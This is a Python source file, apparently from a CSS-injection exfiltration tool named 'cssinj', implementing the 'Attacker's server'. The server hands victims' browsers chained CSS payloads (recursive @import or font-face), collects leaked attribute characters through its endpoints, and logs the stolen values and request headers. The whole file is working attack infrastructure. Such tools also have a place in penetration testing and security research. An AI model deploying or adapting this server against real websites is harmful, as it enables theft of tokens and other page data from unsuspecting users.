from cssinj.exfiltrator import injection
from cssinj.client import Client
from cssinj.console import Console
from cssinj.utils.dom import Attribut, Element
from cssinj.utils.error import InjectionError
from aiohttp import web
import asyncio


class Server:
    def __init__(self, clients, args):
        self.hostname = args.hostname
        self.port = args.port
        self.element = args.element
        self.attribut = args.attribut
        self.show_details = args.details
        self.method = args.method
        self.clients = clients
        self.app = web.Application(
            middlewares=[self.error_middleware, self.dynamic_router_middleware]
        )

    async def start(self):
        self.runner = web.AppRunner(self.app)
        await self.runner.setup()

        site = web.TCPSite(self.runner, self.hostname, self.port)
        await site.start()
        Console.log(
            "server", f"Attacker's server started on {self.hostname}:{self.port}"
        )
        while True:
            await asyncio.sleep(3600)

    async def stop(self):
        Console.log("server", f"Attacker's server cleaning up.")
        if self.runner:
            await self.runner.cleanup()
        Console.log("server", f"Attacker's server stopped.")

    async def handle_start(self, request):
        client = Client(
            host=request.remote,
            accept=request.get("accept"),
            user_agent=request.get("user_agent"),
            event=asyncio.Event(),
        )
        self.clients.append(client)
        Console.log("connection", f"Connection from {client.host}")
        Console.log("connection_details", f"ID : {client.id}")
        client.event.set()

        if self.show_details:
            for key, value in request.headers.items():
                Console.log("connection_details", f"{key} : {value}")
        if self.method == "recursive":
            return web.Response(
                text=injection.generate_next_import(self.hostname, self.port, client),
                content_type="text/css",
            )
        elif self.method == "font-face":
            return web.Response(
                text=injection.generate_payload_font_face(
                    hostname=self.hostname,
                    port=self.port,
                    attribut=self.attribut,
                    element=self.element,
                    client=client,
                ),
                content_type="text/css",
            )

    async def handle_end(self, request):
        client_id = request.query.get("cid")

        client = self.clients[client_id]

        assert client is not None, InjectionError(f"Unknown client id")

        element = Element(name=self.element)
        element.attributs.append(Attribut(name=self.attribut, value=client.data))
        client.elements.append(element)

        client.event.set()

        Console.log(
            "end_exfiltration",
            f"[{client.id}] - The {self.attribut} exfiltrated from {self.element} is : {client.data}",
        )

        client.data = ""

        return web.Response(
            text=f"ok",
            content_type="text/css",
        )

    async def handle_next(self, request):
        client_id = request.query.get("cid")
        client = self.clients[client_id]

        assert client is not None, InjectionError(f"Unknown client id")

        client.counter += 1

        await client.event.wait()

        client.event.clear()

        return web.Response(
            text=injection.generate_payload_recursive_import(
                hostname=self.hostname,
                port=self.port,
                element=self.element,
                attribut=self.attribut,
                client=client,
            ),
            content_type="text/css",
        )

    async def handle_valid(self, request):
        client_id = request.query.get("cid")
        client = self.clients[client_id]

        assert client is not None, InjectionError(f"Unknown client id")

        client.event.set()
        client.data = request.query.get("t")

        if self.show_details:
            Console.log(
                "exfiltration",
                f"[{client.id}] - Exfiltrating element {len(client.elements)} : {client.data}",
            )
        if self.method == "recursive":
            return web.Response(text="ok.", content_type="image/x-icon")
        elif self.method == "font-face":
            return web.Response(text="ok.", content_type="application/x-font-ttf")

    async def dynamic_router_middleware(self, app, handler):
        async def middleware_handler(request):
            path = request.path

            if path.startswith("/start"):
                return await self.handle_start(request)
            elif path.startswith("/n"):
                return await self.handle_next(request)
            elif path.startswith("/v"):
                return await self.handle_valid(request)
            elif path.startswith("/e"):
                return await self.handle_end(request)
            return web.Response(text="404: Not Found", status=404)

        return middleware_handler

    @web.middleware
    async def error_middleware(self, request, handler):
        try:
            response = await handler(request)   
            return response
        except Exception as ex:
            Console.error_handler(ex, context={"source": "middleware"})
            return web.Response(text="500: Internal Server Error", status=500)
